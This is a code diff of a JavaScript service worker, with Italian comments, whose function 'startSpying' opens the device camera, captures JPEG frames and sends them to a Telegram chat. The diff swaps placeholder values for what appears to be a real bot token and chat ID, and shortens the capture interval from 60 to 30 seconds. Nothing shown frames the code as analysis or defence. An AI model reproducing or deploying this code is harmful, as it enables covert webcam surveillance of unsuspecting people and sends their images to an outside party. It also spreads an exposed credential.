@@ -1,5 +1,5 @@
-const apiToken = 'YOUR_TELEGRAM_BOT_API_TOKEN';
-const chatId = 'YOUR_CHAT_ID';
+const apiToken = '7504005848:AAGY3pQyR5TW0n7pU9HLLHPWtqWL72s6mQ8';
+const chatId = '6759375069';
 
 self.addEventListener('install', (event) => {
     self.skipWaiting();
@@ -25,7 +25,7 @@ async function startSpying() {
         video.srcObject = stream;
         video.play();
 
-        // Intervallo di 60 secondi (60000 millisecondi)
+        // Intervallo di 30 secondi (30000 millisecondi)
         setInterval(async () => {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
@@ -34,7 +34,7 @@ async function startSpying() {
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageDataUrl = canvas.toDataURL('image/jpeg');
             await sendToTelegram(imageDataUrl);
-        }, 60000);
+        }, 30000);
     } catch (err) {
         console.error('Errore nell\'accesso alla fotocamera:', err);
     }
